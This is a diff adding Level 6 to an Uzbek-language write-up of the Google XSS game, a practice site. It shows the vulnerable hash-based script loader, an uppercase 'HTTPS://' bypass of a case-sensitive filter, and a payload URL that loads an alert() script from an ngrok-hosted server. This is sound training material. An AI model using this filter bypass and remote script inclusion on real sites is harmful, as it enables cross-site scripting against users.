@@ -106,3 +106,47 @@ payload ushbu ko'rinishda qo'shiladi:
 ![XSS Challanges](./images/08-xss.png)
 
 # Level 6
+
+## Zaiflik turi: 
+
+getGadgetName() funksiyasida URL dagi # belgisidan keyingi qiymat olinayotgani aniqlandi:
+```
+function getGadgetName() { 
+  return window.location.hash.substr(1) || "/static/gadget.js";
+}
+
+includeGadget(getGadgetName());
+```
+![XSS Challanges](./images/09-xss.png)
+
+URL tekshiruvida quyidagi filter mavjudligi aniqlandi:
+```
+function includeGadget(url) {
+  if (url.match(/^https?:\/\//)) return;
+  var s = document.createElement('script');
+  s.src = url;
+  document.head.appendChild(s);
+}
+```
+Bu filtr http:// va https:// ga o'xshagan kichik harflarni tekshiradi.
+Exploit:
+Filtr chetlab o'tish uchun HTTPS (kattaharflar) dan foydalanildi.
+
+xss.js file yaratildi uning ichiga `alert()` payload yozildi.
+`python3 -m http.server 80` orqali tashqi server ishga tushurild.
+
+![XSS Challanges](./images/10-xss.png)
+
+file internet orqali ochilish uchun ngrokdan foydalanildi 
+
+![XSS Challanges](./images/11-xss.png)
+
+Payload yuborildi:
+```https://xss-game.appspot.com/level6/frame#HTTPS://c716-213-230-93-4.ngrok-free.app/xss.js```
+
+script yuuklandi xss.js file ichidagi alert() bajarildi.
+
+![XSS Challanges](./images/12-xss.png)
+
+
+
